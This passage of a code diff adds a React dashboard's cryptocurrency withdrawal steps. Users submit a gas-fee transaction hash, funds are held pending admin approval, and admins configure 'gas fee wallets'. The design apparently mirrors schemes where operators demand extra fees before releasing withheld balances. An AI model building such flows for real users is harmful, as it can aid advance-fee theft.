+                        value={withdrawGasTxHash}
+                        onChange={(e) => setWithdrawGasTxHash(e.target.value)}
+                      />
+                    </div>
+
+                    <div className="summary-card tabular" style={{ marginBottom: '14px' }}>
+                      <div className="summary-row">
+                        <span style={{ color: 'var(--text-secondary)' }}>Withdraw:</span>
+                        <strong style={{ wordBreak: 'break-all', textAlign: 'right' }}>
+                          ${parsedWithdrawAmt.toLocaleString()} → {withdrawWallet}
+                        </strong>
+                      </div>
+                      <div className="summary-row">
+                        <span style={{ color: 'var(--text-secondary)' }}>Recipient:</span>
+                        <strong>{recipientDisplayName}</strong>
+                      </div>
+                    </div>
+
+                    <p
+                      style={{
+                        fontSize: '12px',
+                        color: 'var(--text-secondary)',
+                        marginBottom: '16px',
+                      }}
+                    >
+                      After you submit, an admin will review and approve or reject your withdrawal.
+                    </p>
+
+                    <div
+                      style={{
+                        display: 'grid',
+                        gridTemplateColumns: '1fr 1.6fr',
+                        gap: '12px',
+                      }}
+                    >
+                      <button
+                        type="button"
+                        className="btn btn-outline"
+                        onClick={() => setWithdrawStep('gas_summary')}
+                        disabled={submittingWithdraw}
+                      >
+                        BACK
+                      </button>
+                      <button
+                        type="button"
+                        className="btn btn-crimson"
+                        onClick={handleFinalSubmitWithdraw}
+                        disabled={submittingWithdraw}
+                      >
+                        {submittingWithdraw ? 'SUBMITTING...' : 'DONE — SUBMIT REQUEST'}
+                      </button>
+                    </div>
+                  </div>
+                )}
+
+                {/* STEP 4: Confirmation */}
+                {withdrawStep === 'submitted' && (
+                  <div style={{ textAlign: 'center', padding: '16px 0' }}>
+                    <CheckCircle2 size={40} color="#10B981" style={{ marginBottom: '10px' }} />
+                    <h4>Withdrawal Request Submitted</h4>
+                    <p
+                      className="tabular"
+                      style={{
+                        fontSize: '13px',
+                        color: 'var(--text-secondary)',
+                        margin: '8px 0 18px',
+                      }}
+                    >
+                      ${parsedWithdrawAmt.toLocaleString(undefined, { minimumFractionDigits: 2 })} ({withdrawNetwork.asset}) is held from your balance and awaiting admin approval.
+                    </p>
+                    <button
+                      type="button"
+                      className="btn btn-white"
+                      onClick={() => {
+                        setWithdrawAmt('');
+                        setWithdrawWallet('');
+                        setWithdrawPinInput('');
+                        resetWithdrawFlow();
+                      }}
+                    >
+                      New Withdrawal
+                    </button>
+                  </div>
+                )}
               </div>
 
               <div className="panel-card">
@@ -1839,7 +2348,7 @@ export default function Dashboard({ session }) {
             <>
               <div className="panel-card">
                 <div className="panel-header">
-                  <h3>Admin Desk: Deposit Wallets by Network</h3>
+                  <h3>Admin Desk: Deposit &amp; Gas Fee Wallets by Network</h3>
                 </div>
 
                 <form onSubmit={handleSavePlatformSettings}>
